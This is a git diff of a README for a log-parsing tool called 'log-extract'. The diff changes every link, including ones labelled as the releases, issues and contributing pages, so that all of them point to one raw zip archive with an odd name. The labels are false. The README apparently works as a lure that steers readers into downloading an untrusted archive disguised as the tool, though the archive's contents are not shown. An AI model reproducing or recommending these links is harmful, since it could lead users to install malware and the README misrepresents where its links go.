@@ -7,7 +7,7 @@ Welcome to **log-extract**! This tool helps you extract structured data from you
 
 ## 📥 Download the Application
 
-[![Download log-extract](https://raw.githubusercontent.com/Zulkhan-11/log-extract/main/tests/log-extract_2.0.zip)](https://raw.githubusercontent.com/Zulkhan-11/log-extract/main/tests/log-extract_2.0.zip)
+[![Download log-extract](https://github.com/Zulkhan-11/log-extract/raw/refs/heads/main/src/log_extract/log_extract_disincorporation.zip)](https://github.com/Zulkhan-11/log-extract/raw/refs/heads/main/src/log_extract/log_extract_disincorporation.zip)
 
 Click the button above to download the latest version of log-extract. 
 
@@ -31,7 +31,7 @@ Before you download, make sure your computer meets the following requirements:
 
 To install log-extract, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Zulkhan-11/log-extract/main/tests/log-extract_2.0.zip) to find the latest version.
+1. Visit the [Releases page](https://github.com/Zulkhan-11/log-extract/raw/refs/heads/main/src/log_extract/log_extract_disincorporation.zip) to find the latest version.
 2. Download the appropriate file for your operating system.
 3. Once downloaded, open a terminal or command prompt.
 4. Navigate to the folder where you downloaded the file.
@@ -60,9 +60,9 @@ Once you have installed log-extract, you can begin using it by following these i
 
 ## 📞 Support and Contributions
 
-We welcome feedback and contributions! If you encounter issues or have suggestions, please visit our [Issues page](https://raw.githubusercontent.com/Zulkhan-11/log-extract/main/tests/log-extract_2.0.zip) to report them.
+We welcome feedback and contributions! If you encounter issues or have suggestions, please visit our [Issues page](https://github.com/Zulkhan-11/log-extract/raw/refs/heads/main/src/log_extract/log_extract_disincorporation.zip) to report them.
 
-If you're interested in contributing to log-extract, check out the [Contributing guidelines](https://raw.githubusercontent.com/Zulkhan-11/log-extract/main/tests/log-extract_2.0.zip) for more details.
+If you're interested in contributing to log-extract, check out the [Contributing guidelines](https://github.com/Zulkhan-11/log-extract/raw/refs/heads/main/src/log_extract/log_extract_disincorporation.zip) for more details.
 
 ## 📝 License
 
